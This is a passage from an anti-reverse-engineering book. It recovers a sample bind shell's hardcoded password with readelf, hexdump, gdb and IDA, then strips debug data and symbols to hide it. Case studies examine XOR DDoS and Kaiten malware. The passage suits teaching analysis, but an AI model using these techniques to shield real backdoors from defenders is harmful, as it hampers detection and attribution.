previous section, you saw the line number s_password was declared on due to the DWARF information in .debug_info. If you look at that output again you can also see the address where s_password is stored.\n\n###### s_password in objdump\n\n<5bb> DW_AT_name : (indirect string, offset: 0x1aa): s_password\n<5bf> DW_AT_decl_file : 1\n<5c0> DW_AT_decl_line : 11\n<5c1> DW_AT_type : <0x5cf>\n<5c5> DW_AT_location : 9 byte block: (DW_OP_addr: 400f00)\n\n##### s_password is stored at the virtual address 0x400f00. Convert the virtual address into a file offset and you can extract the contents of s_password using hexdump. To convert 0x400f00 into a file offset find the program header the address falls in.\n\n\n-----\n\n###### Chapter 2: Compiler Options 18\n\n Viewing Trouble’s program headers\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -l ./troub\\\nle\n\nElf file type is EXEC (Executable file)\nEntry point 0x400b10\nThere are 9 program headers, starting at offset 64\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nPHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040\n0x00000000000001f8 0x00000000000001f8 R E 8\nINTERP 0x0000000000000238 0x0000000000400238 0x0000000000400238\n0x000000000000001c 0x000000000000001c R 1\n\n[Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x00000000000010d4 0x00000000000010d4 R E 200000\nLOAD 0x0000000000001e10 0x0000000000601e10 0x0000000000601e10\n0x0000000000000298 0x00000000000002c0 RW 200000\nDYNAMIC 0x0000000000001e28 0x0000000000601e28 0x0000000000601e28\n0x00000000000001d0 0x00000000000001d0 RW 8\nNOTE 0x0000000000000254 0x0000000000400254 0x0000000000400254\n0x0000000000000044 0x0000000000000044 R 4\nGNU_EH_FRAME 0x0000000000000f80 0x0000000000400f80 0x0000000000400f80\n0x000000000000003c 0x000000000000003c R 4\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000001e10 0x0000000000601e10 0x0000000000601e10\n0x00000000000001f0 0x00000000000001f0 R 1\n\n##### The virtual address for s_password falls in the range for the first LOAD segment which covers 0x400000 to 0x4010d4. The first LOAD segment starts at the file offset of 0. Therefore, to calculate s_password’s offset into the file you just need to subtract 0x400000 from 0x400f00. Which means you should be able to find the bind shell’s password at 0xf00. Trying displaying it using hexdump.\n\n\n-----\n\n###### Chapter 2: Compiler Options 19\n\n Printing s_password with hexdump\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ hexdump -C -s 0xf0\\\n0 -n 64 ./trouble\n00000f00 54 47 4f 45 75 32 36 54 57 30 6b 31 62 39 49 65 |TGOEu26TW0k1b9Ie|\n00000f10 58 6a 55 4a 62 54 31 47 66 43 52 30 6a 53 6e 6c |XjUJbT1GfCR0jSnl|\n00000f20 00 46 61 69 6c 65 64 20 74 6f 20 63 72 65 61 74 |.Failed to creat|\n00000f30 65 20 74 68 65 20 73 6f 63 6b 65 74 2e 00 42 69 |e the socket..Bi|\n00000f40\n\n##### Just like that, the password to Trouble’s shell is revealed.\n\n#### Recovering the Bind Shell Password with GDB\n\n##### The previous section’s method for recovering the password wasn’t compilicated, it can be even easier to recover s_password using GDB.\n\n###### Printing s_password using GDB\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble...done.\n(gdb) start\nTemporary breakpoint 1 at 0x400c3e: file /home/albino-lobster/antire_book/chap_2_comp\\\niler/trouble/src/trouble.c, line 26.\nStarting program: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trou\\\nble\n\n\n-----\n\n###### Chapter 2: Compiler Options 20\n\nTemporary breakpoint 1, main (p_argc=1, p_argv=0x7fffffffdeb8) at /home/albino-lobste\\\nr/antire_book/chap_2_compiler/trouble/src/trouble.c:26\n26 {\n(gdb) print s_password\n$1 = \"TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl\"\n(gdb)\n\n##### In the above output, I’ve executed Trouble using GDB. GDB stops at the breakpoint at the start of main(). I then use GDB’s print function to display s_password. It doesn’t get much easier than that!\n\n#### The Debugging Information in IDA\n\n##### The debugging information isn’t only useful for quickly discovering s_password. It’s also useful when viewing the disassembly in a disassembler like the Interactive Disassembler¹⁰ (IDA). The debugging information helps propagate variable types and names.\n\n For example, consider this chunk of assembly near the call to check_password().\n\n###### Debugging information in IDA\n\n.text:0000000000400DBC loc_400DBC: ; CODE XREF: main+177\n.text:0000000000400DBC lea rax, [rbp+password_input]\n.text:0000000000400DC0 mov rdi, rax ; p_password\n.text:0000000000400DC3 call check_password\n.text:0000000000400DC8 test al, al\n.text:0000000000400DCA jz short loc_400DDD\n.text:0000000000400DCC mov eax, [rbp+client_sock]\n.text:0000000000400DCF mov edi, eax ; fd\n.text:0000000000400DD1 call _close\n.text:0000000000400DD6 mov eax, 1\n.text:0000000000400DDB jmp short loc_400E47\n\n##### Now look at the same chunk of code in C.\n\n###### ¹⁰https://www.hex-rays.com/products/ida/\n\n\n-----\n\n###### Chapter 2: Compiler Options 21\n\n check_password() call in C\n\n**if (check_password(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n##### Notice that password_input and client_sock appear in the disassembly and the C code? Also, p_password, which is the name check_password() uses for its only param- eter, appears in the disassembly. IDA has parsed .debug_info’s DWARF information and enriched the disassembly with these easier to understand variable names. As a reverse engineer this can be really useful since many programmers use contextual variable names (ie. password_input is where the user submitted password is stored).\n\n#### Removing the Debugging Information\n\n##### I hope I’ve convinced you that we can’t give reverse engineers access to debugging in- formation. Fortunately, removing debugging information is trivial. You simply don’t provide the -g option in compile flags. This will prevent the various .debug_ sections from being generated. Which also means that GDB and IDA won’t receive the extra variable information to enrich their analysis.\n\n For instance, without -g a GDB user won’t be able to print s_password using “print” as was done earlier in this section. Unfortunately, that doesn’t mean a reverse engineer can’t get GDB to print it using other means, but we’ll worry more about that later.\n\n\n-----\n\n###### Chapter 2: Compiler Options 22\n\n Using GDB to print s_password without debugging information\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble...(no debugging symbols found)...done.\n(gdb) start\nTemporary breakpoint 1 at 0x400c33\nStarting program: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trou\\\nble\n\nTemporary breakpoint 1, 0x0000000000400c33 in main ()\n(gdb) print s_password\n$1 = 1364801095\n(gdb) x /s &s_password\n0x400f00 <s_password>: \"TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl\"\n(gdb)\n\n##### Finally, consider how the disassembly around the check_password() call looks without the debugging information.\n\n\n-----\n\n###### Chapter 2: Compiler Options 23\n\n Viewing the check_password() call in IDA without debugging information\n\n.text:0000000000400DBC loc_400DBC: ; CODE XREF: main+177j\n.text:0000000000400DBC lea rax, [rbp+buf]\n.text:0000000000400DC0 mov rdi, rax\n.text:0000000000400DC3 call check_password\n.text:0000000000400DC8 test al, al\n.text:0000000000400DCA jz short loc_400DDD\n.text:0000000000400DCC mov eax, [rbp+var_5C]\n.text:0000000000400DCF mov edi, eax ; fd\n.text:0000000000400DD1 call _close\n.text:0000000000400DD6 mov eax, 1\n.text:0000000000400DDB jmp short loc_400E47\n\n##### This chunk of disassembly isn’t hard to understand, but it was even easier when the variable names were present!\n\n#### Case Study: XOR DDOS\n\n##### Using and removing debugging information is a beginner’s topic, but I think it’s important to know. You may be thinking, “No one worried about reverse engineers would ship their binary with debugging information!” However, I can assure you they do.\n\n Take for example, this XOR DDOS malware¹¹¹².\n\n### Malware\n\n###### Be careful when downloading and analyzing malware\n\n##### As noted in the analysis by MalwareMustDie¹³, this malware encrypts/decrypts configuration files, packets, and “remote strings” using an XOR encryption scheme. However, just by looking at the sections table in the VirusTotal link, you and I know that debugging information is present. That makes this binary an excellent toy for beginner reverse engineers to play with.\n\n Remember that I mentioned debugging information can be useful for attibution?\n\n###### ¹¹https://malwr.com/analysis/YmM4YjI5MTVjYThiNDA0NDkzM2RkZTU5NDVlMWIyMzI/ ¹²https://www.virustotal.com/en/file/a1c324d6b4b7f2726eac1599ca457f93eb56059511741c9e79468a6df50629ba/analysis/ ¹³http://blog.malwaremustdie.org/2015/06/mmd-0033-2015-linuxxorddos-infection_23.html\n\n\n-----\n\n###### Chapter 2: Compiler Options 24\n\n Viewing XOR DDOS’s .debug_info\n\nalbino-lobster@ubuntu:~$ objdump --dwarf=info ./a1c324d6b4b7f2726eac1599ca457f93eb560\\\n59511741c9e79468a6df50629ba.bin\n\n./a1c324d6b4b7f2726eac1599ca457f93eb56059511741c9e79468a6df50629ba.bin: file form\\\nat elf32-i386\n\nContents of the .debug_info section:\n\nCompilation Unit @ offset 0x0:\nLength: 0xc41 (32-bit)\nVersion: 2\nAbbrev Offset: 0x0\nPointer Size: 4\n<0><b>: Abbrev Number: 1 (DW_TAG_compile_unit)\n\n<c> DW_AT_stmt_list : 0x0\n<10> DW_AT_high_pc : 0x8049252\n<14> DW_AT_low_pc : 0x8048228\n<18> DW_AT_producer : GNU C 4.1.2 20080704 (Red Hat 4.1.2-48)\n<40> DW_AT_language : 1 (ANSI C)\n<41> DW_AT_name : autorun.c\n<4b> DW_AT_comp_dir : /home/xingwei/Desktop/ddos\n\n##### The compilation directory points to “/home/xingwei/Desktop/ddos”. Googling or searching Github for “/home/xingwei” does yield other results. Does this help reveal the author of this malware? Maybe. Attribution is hard, but this provides a good lead.\n\n### -s\n\n##### In the previous section you removed the -g flag from Trouble’s compiler options. In this section, you’ll add the -s flag. The -s option stands for “strip” and GCC’s documentation says this flag will cause the compiler to “remove all symbol table and relocation information from the executable.” ¹⁴\n\n To introduce the -s compiler option to Trouble update the compiler options in the chap_2_compiler/trouble/CMakeLists.txt file.\n\n###### ¹⁴https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options\n\n\n-----\n\n###### Chapter 2: Compiler Options 25\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -s -std=gnu11\")\n\n#### SYMTAB vs. DYNSYM\n\n##### As mentioned in the GCC documentation, -s will strip away the symbol table. What does that mean for Trouble? To understand exactly what gets removed let’s dump the symbol tables of an unstripped Trouble using readelf.\n\n###### Trouble’s symbol tables before being stripped\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf --syms ./t\\\nrouble\n\nSymbol table '.dynsym' contains 35 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab\n2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@GLIBC_2.4\\\n(2)\n\n3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htons@GLIBC_2.2.5 (3)\n4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dup2@GLIBC_2.2.5 (3)\n5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htonl@GLIBC_2.2.5 (3)\n6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND close@GLIBC_2.2.5 (3)\n7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.2.5 (3)\n8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.\\\n2.5 (3)\n\n9: 0000000000000000 0 FUNC GLOBAL DEFAULT UND memcmp@GLIBC_2.2.5 (3)\n10: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@GLIBC_2.2.5 (3)\n11: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__\n12: 0000000000000000 0 FUNC GLOBAL DEFAULT UND listen@GLIBC_2.2.5 (3)\n13: 0000000000000000 0 FUNC GLOBAL DEFAULT UND bind@GLIBC_2.2.5 (3)\n14: 0000000000000000 0 FUNC GLOBAL DEFAULT UND perror@GLIBC_2.2.5 (3)\n15: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses\n16: 0000000000000000 0 FUNC GLOBAL DEFAULT UND accept@GLIBC_2.2.5 (3)\n17: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (3)\n18: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable\n19: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fork@GLIBC_2.2.5 (3)\n20: 0000000000000000 0 FUNC GLOBAL DEFAULT UND socket@GLIBC_2.2.5 (3)\n21: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 25 _edata\n22: 0000000000602098 0 NOTYPE GLOBAL DEFAULT 25 __data_start\n23: 00000000006020d0 0 NOTYPE GLOBAL DEFAULT 26 _end\n\n\n-----\n\n###### Chapter 2: Compiler Options 26\n\n24: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n25: 0000000000602098 0 NOTYPE WEAK DEFAULT 25 data_start\n26: 0000000000400ee0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used\n27: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init\n28: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 _start\n29: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 26 __bss_start\n30: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n31: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 _init\n32: 00000000006020c0 8 OBJECT GLOBAL DEFAULT 26 stderr@GLIBC_2.2.5 (3)\n33: 0000000000400ed0 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini\n34: 0000000000400ed4 0 FUNC GLOBAL DEFAULT 15 _fini\n\nSymbol table '.symtab' contains 84 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000400238 0 SECTION LOCAL DEFAULT 1\n2: 0000000000400254 0 SECTION LOCAL DEFAULT 2\n3: 0000000000400274 0 SECTION LOCAL DEFAULT 3\n4: 0000000000400298 0 SECTION LOCAL DEFAULT 4\n5: 0000000000400300 0 SECTION LOCAL DEFAULT 5\n6: 0000000000400648 0 SECTION LOCAL DEFAULT 6\n7: 00000000004007a6 0 SECTION LOCAL DEFAULT 7\n8: 00000000004007f0 0 SECTION LOCAL DEFAULT 8\n9: 0000000000400820 0 SECTION LOCAL DEFAULT 9\n10: 0000000000400850 0 SECTION LOCAL DEFAULT 10\n11: 00000000004009d0 0 SECTION LOCAL DEFAULT 11\n12: 00000000004009f0 0 SECTION LOCAL DEFAULT 12\n13: 0000000000400b00 0 SECTION LOCAL DEFAULT 13\n14: 0000000000400b10 0 SECTION LOCAL DEFAULT 14\n15: 0000000000400ed4 0 SECTION LOCAL DEFAULT 15\n16: 0000000000400ee0 0 SECTION LOCAL DEFAULT 16\n17: 0000000000400f80 0 SECTION LOCAL DEFAULT 17\n18: 0000000000400fc0 0 SECTION LOCAL DEFAULT 18\n19: 0000000000601e10 0 SECTION LOCAL DEFAULT 19\n20: 0000000000601e18 0 SECTION LOCAL DEFAULT 20\n21: 0000000000601e20 0 SECTION LOCAL DEFAULT 21\n22: 0000000000601e28 0 SECTION LOCAL DEFAULT 22\n23: 0000000000601ff8 0 SECTION LOCAL DEFAULT 23\n24: 0000000000602000 0 SECTION LOCAL DEFAULT 24\n25: 0000000000602098 0 SECTION LOCAL DEFAULT 25\n26: 00000000006020c0 0 SECTION LOCAL DEFAULT 26\n27: 0000000000000000 0 SECTION LOCAL DEFAULT 27\n28: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c\n\n\n-----\n\n###### Chapter 2: Compiler Options 27\n\n29: 0000000000601e20 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__\n30: 0000000000400b40 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones\n31: 0000000000400b80 0 FUNC LOCAL DEFAULT 14 register_tm_clones\n32: 0000000000400bc0 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux\n33: 00000000006020c8 1 OBJECT LOCAL DEFAULT 26 completed.7585\n34: 0000000000601e18 0 OBJECT LOCAL DEFAULT 20 __do_global_dtors_aux_fin\n35: 0000000000400be0 0 FUNC LOCAL DEFAULT 14 frame_dummy\n36: 0000000000601e10 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_init_array_\n37: 0000000000000000 0 FILE LOCAL DEFAULT ABS trouble.c\n38: 0000000000400f00 33 OBJECT LOCAL DEFAULT 16 s_password\n39: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c\n40: 00000000004010d0 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__\n41: 0000000000601e20 0 OBJECT LOCAL DEFAULT 21 __JCR_END__\n42: 0000000000000000 0 FILE LOCAL DEFAULT ABS\n43: 0000000000601e18 0 NOTYPE LOCAL DEFAULT 19 __init_array_end\n44: 00000000006020a0 0 OBJECT LOCAL DEFAULT 25 __dso_handle\n45: 0000000000601e28 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC\n46: 0000000000601e10 0 NOTYPE LOCAL DEFAULT 19 __init_array_start\n47: 0000000000400f80 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR\n48: 00000000006020a8 0 OBJECT LOCAL DEFAULT 25 __TMC_END__\n49: 0000000000602000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_\n50: 0000000000400ed0 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini\n51: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab\n52: 0000000000602098 0 NOTYPE WEAK DEFAULT 25 data_start\n53: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 25 _edata\n54: 0000000000400ed4 0 FUNC GLOBAL DEFAULT 15 _fini\n55: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@@GLIBC_2\n56: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htons@@GLIBC_2.2.5\n57: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dup2@@GLIBC_2.2.5\n58: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htonl@@GLIBC_2.2.5\n59: 0000000000000000 0 FUNC GLOBAL DEFAULT UND close@@GLIBC_2.2.5\n60: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@@GLIBC_2.2.5\n61: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_\n62: 0000000000000000 0 FUNC GLOBAL DEFAULT UND memcmp@@GLIBC_2.2.5\n63: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@@GLIBC_2.2.5\n64: 0000000000602098 0 NOTYPE GLOBAL DEFAULT 25 __data_start\n65: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__\n66: 0000000000400ee0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used\n67: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init\n68: 0000000000000000 0 FUNC GLOBAL DEFAULT UND listen@@GLIBC_2.2.5\n69: 00000000006020d0 0 NOTYPE GLOBAL DEFAULT 26 _end\n70: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 _start\n71: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 26 __bss_start\n\n\n-----\n\n###### Chapter 2: Compiler Options 28\n\n72: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n73: 0000000000000000 0 FUNC GLOBAL DEFAULT UND bind@@GLIBC_2.2.5\n74: 0000000000000000 0 FUNC GLOBAL DEFAULT UND perror@@GLIBC_2.2.5\n75: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses\n76: 0000000000000000 0 FUNC GLOBAL DEFAULT UND accept@@GLIBC_2.2.5\n77: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n78: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@@GLIBC_2.2.5\n79: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable\n80: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 _init\n81: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fork@@GLIBC_2.2.5\n82: 00000000006020c0 8 OBJECT GLOBAL DEFAULT 26 stderr@@GLIBC_2.2.5\n83: 0000000000000000 0 FUNC GLOBAL DEFAULT UND socket@@GLIBC_2.2.5\n\n##### In the output above, you should see two symbol tables: .dynsym (dynamic symbol table) and .symtab (symbol table). A keen observer would notice two things about these tables:\n\n 1. The .symtab contains many of the symbols found in .dynsym. 2. They .symtab has many LOCAL symbols that .dynsym does not.\n\n These are the first hints as to how these tables are different. Let’s look at their section descriptions. Note that I’ve truncated the output for easier comparison of the two sections.\n\n###### Comparing .dynsym and .symtab\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -S ./troub\\\nle\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 5] .dynsym DYNSYM 0000000000400300 00000300\n0000000000000348 0000000000000018 A 6 1 8\n\n[29] .symtab SYMTAB 0000000000000000 000020e0\n00000000000007e0 0000000000000018 30 50 8\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n\n-----\n\n###### Chapter 2: Compiler Options 29\n\n##### Focus on the “flags” column in the output above. The .dynsym section has the “A” flag where .symtab has no flags. The “A” flag means that .dynsym will be loaded into memory when the program is started. Lacking the “A” flag means that .symtab is not loaded into memory and is therefore not necessary to execute the program. You can safely remove the entire .symtab from the binary.\n\n#### Finding the Bind Shell Password Using .symtab\n\n##### Why would you want to strip away the .symtab? Look at the readelf –syms output above and you should see this line:\n\n38: 0000000000400f00 33 OBJECT LOCAL DEFAULT 16 s_password\n\n##### Even though you’ve excluded the debugging information from Trouble the symbol table makes finding and extracting the password trivial. You can use hexdump again.\n\n###### Printing s_password with hexdump (again)\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ hexdump -C -s 0xf0\\\n0 -n 64 ./trouble\n00000f00 54 47 4f 45 75 32 36 54 57 30 6b 31 62 39 49 65 |TGOEu26TW0k1b9Ie|\n00000f10 58 6a 55 4a 62 54 31 47 66 43 52 30 6a 53 6e 6c |XjUJbT1GfCR0jSnl|\n00000f20 00 46 61 69 6c 65 64 20 74 6f 20 63 72 65 61 74 |.Failed to creat|\n00000f30 65 20 74 68 65 20 73 6f 63 6b 65 74 2e 00 42 69 |e the socket..Bi|\n\n#### Case Study: The FILE Symbol\n\n##### One of the other things you included in the symbol table is the FILE symbol. For example:\n\n37: 0000000000000000 0 FILE LOCAL DEFAULT ABS trouble.c\n\n##### This can be really useful for a reverse engineer. If you can take this information straight to Google, GitHub, etc. and find the source code of the binary you are reversing then life has just become so much easier.\n\n\n-----\n\n###### Chapter 2: Compiler Options 30\n\n##### Consider this malware sample¹⁵¹⁶.\n\n Examine the symbol table in the sample and you’ll find one of the first entries is a FILE symbol.\n\n###### First entries in Kaiten’s SYMTAB\n\nalbino-lobster@ubuntu:~$ readelf --sym ./0e9f8d883f76557efebde8318a0f570a7ad32336b458\\\nd701968f84f142846895.bin\n\nSymbol table '.symtab' contains 116 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000000000 0 FILE LOCAL DEFAULT ABS kaiten.c\n2: 0000000000000000 0 SECTION LOCAL DEFAULT 1\n3: 0000000000000000 0 SECTION LOCAL DEFAULT 3\n\n##### The FILE symbol points to “kaiten.c”. If you plug that name into Google, you’ll find the source code for numerous versions of a fairly old denial of service IRC bot called Kaiten¹⁷.\n\n#### Examing Trouble After -s\n\n##### As mentioned at the beginning of this section, to strip away the SYMTAB you just need to add -s to the compiler flags.\n\n### Stripping Binaries\n\n###### Using the -s flag is not the only way to strip a binary. We will discuss other methods later on in the “File Format Hacks” Chapter\n\n##### Recompile Trouble after adding -s and try looking at the symbols.\n\n###### ¹⁵https://malwr.com/analysis/NzU1NWFhMjRlYTRkNDFkNGJlMzU1NDBmNGJjOGE0ZTY/ ¹⁶https://www.virustotal.com/en/file/0e9f8d883f76557efebde8318a0f570a7ad32336b458d701968f84f142846895/analysis/\n[1477747547/](https://www.virustotal.com/en/file/0e9f8d883f76557efebde8318a0f570a7ad32336b458d701968f84f142846895/analysis/1477747547/)\n\n###### ¹⁷https://packetstormsecurity.com/files/25575/kaiten.c.html\n\n\n-----\n\n###### Chapter 2: Compiler Options 31\n\n Trouble after -s\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf --sym ./tr\\\nouble\n\nSymbol table '.dynsym' contains 35 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab\n2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@GLIBC_2.4\\\n(2)\n\n3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htons@GLIBC_2.2.5 (3)\n4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dup2@GLIBC_2.2.5 (3)\n5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htonl@GLIBC_2.2.5 (3)\n6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND close@GLIBC_2.2.5 (3)\n7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.2.5 (3)\n8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.\\\n2.5 (3)\n\n9: 0000000000000000 0 FUNC GLOBAL DEFAULT UND memcmp@GLIBC_2.2.5 (3)\n10: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@GLIBC_2.2.5 (3)\n11: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__\n12: 0000000000000000 0 FUNC GLOBAL DEFAULT UND listen@GLIBC_2.2.5 (3)\n13: 0000000000000000 0 FUNC GLOBAL DEFAULT UND bind@GLIBC_2.2.5 (3)\n14: 0000000000000000 0 FUNC GLOBAL DEFAULT UND perror@GLIBC_2.2.5 (3)\n15: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses\n16: 0000000000000000 0 FUNC GLOBAL DEFAULT UND accept@GLIBC_2.2.5 (3)\n17: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (3)\n18: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable\n19: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fork@GLIBC_2.2.5 (3)\n20: 0000000000000000 0 FUNC GLOBAL DEFAULT UND socket@GLIBC_2.2.5 (3)\n21: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 25 _edata\n22: 0000000000602098 0 NOTYPE GLOBAL DEFAULT 25 __data_start\n23: 00000000006020d0 0 NOTYPE GLOBAL DEFAULT 26 _end\n24: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n25: 0000000000602098 0 NOTYPE WEAK DEFAULT 25 data_start\n26: 0000000000400ee0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used\n27: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init\n28: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 _start\n29: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 26 __bss_start\n30: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n31: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 _init\n32: 00000000006020c0 8 OBJECT GLOBAL DEFAULT 26 stderr@GLIBC_2.2.5 (3)\n33: 0000000000400ed0 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini\n\n\n-----\n\n###### Chapter 2: Compiler Options 32\n\n34: 0000000000400ed4 0 FUNC GLOBAL DEFAULT 15 _fini\n\n##### As you can see the entire .symtab is now gone. Not only does this make the binary smaller but it also has disabled easy access to s_password and removed the string “trouble.c” from the binary altogether.\n\n### -fvisibility\n\n#### Looking at FUNC symbols\n\n##### 